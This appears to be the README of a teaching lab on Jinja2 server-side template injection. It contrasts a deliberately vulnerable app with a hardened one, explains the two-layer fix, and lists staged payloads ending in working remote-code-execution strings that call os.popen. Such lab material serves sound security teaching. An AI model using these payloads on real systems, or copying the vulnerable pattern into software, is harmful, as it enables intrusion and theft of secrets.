# RENDER — Jinja2 Lab

## Overview

This lab demonstrates Server-Side Template Injection (SSTI) in the Jinja2 template engine.

- **Vulnerable server:** port 5001 (`python vulnerable_app.py`)
- **Hardened server:** port 5002 (`python hardened_app.py`)

---

## The Vulnerability

### Vulnerable line

```python
result = Template(user_input).render()
```

### Why it's vulnerable

`Template(user_input)` compiles the user-supplied string as a Jinja2 template. Jinja2 evaluates `{{ expr }}` blocks as Python expressions, `{% stmt %}` blocks as control flow, and `{# comment #}` as comments. Because the user controls the template source, they can inject any Jinja2 expression — including expressions that traverse the Python object graph to reach `os` and execute shell commands.

The key insight: Jinja2's template language exposes Python's class hierarchy through attributes like `__class__`, `__mro__`, and `__subclasses__`. An attacker can walk the MRO chain from a base string or list object up to `object`, then enumerate all subclasses to find `subprocess.Popen` or `os._wrap_close` and invoke shell commands without any explicit imports.

---

## The Fix

### Hardened approach

```python
# Step 1: Reject template syntax in user input
TEMPLATE_SYNTAX_PATTERN = re.compile(r'\{\{|\}\}|\{%|%\}|\{#|#\}')
if TEMPLATE_SYNTAX_PATTERN.search(user_input):
    return jsonify({"output": "[BLOCKED: Template syntax detected in input]", ...})

# Step 2: Pass user input as DATA, not template code
template = env.from_string("User input: {{ value }}")
result = template.render(value=user_input)
```

**Two-layer defense:**
1. **Input rejection:** Any input containing `{{`, `}}`, `{%`, `%}`, `{#`, or `#}` is immediately rejected. This prevents the attacker from injecting Jinja2 expression syntax.
2. **Data segregation:** User input is passed as a named variable (`value`), never as template source. The template itself is a static string in the application code. Even if the regex were bypassed, the user's text would be treated as a plain string value.

Additionally, the hardened app uses `Environment(autoescape=select_autoescape())` which HTML-escapes output, providing an extra layer of protection for web contexts.

---

## Attack Stages and Payloads

### Stage 1: Detection
```
{{7*7}}
```
**Vulnerable response:** `49`  
**Hardened response:** `[BLOCKED: Template syntax detected in input]`

### Stage 2: Fingerprinting
```
{{config}}
```
**Vulnerable response:** Flask config object dump including SECRET_KEY  
**Hardened response:** BLOCKED

```
{{self.__class__}}
```
**Vulnerable response:** `<class 'jinja2.environment.TemplateModule'>` — confirms Jinja2  
**Hardened response:** BLOCKED

### Stage 3: Config Extraction
```
{{config.items()}}
```
**Vulnerable response:** All Flask configuration key/value pairs  
**Hardened response:** BLOCKED

### Stage 4: Sandbox Escape (Object Graph Traversal)
```
{{''._ _class_ _._ _mro_ _}}
```
**Vulnerable response:** `(<class 'str'>, <class 'object'>)` — exposes class hierarchy  
**Hardened response:** BLOCKED

```
{{''._ _class_ _._ _mro_ _[1]._ _subclasses_ _()}}
```
**Vulnerable response:** Full list of all Python subclasses in memory  
**Hardened response:** BLOCKED

### Stage 5: RCE
```
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}
```
Where `X` is the index of a class with OS access (varies by Python version).

**Vulnerable response:** Output of `id` command  
**Hardened response:** BLOCKED

Alternative (when `__import__` is accessible):
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

---

## Running the Labs

```bash
# Install dependencies
pip install -r requirements.txt

# Start vulnerable lab (port 5001)
python vulnerable_app.py

# Start hardened lab (port 5002)
python hardened_app.py

# Or use the runner scripts
python run_vulnerable.py
python run_hardened.py
```

---

## References

- [OWASP SSTI](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [PayloadsAllTheThings Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
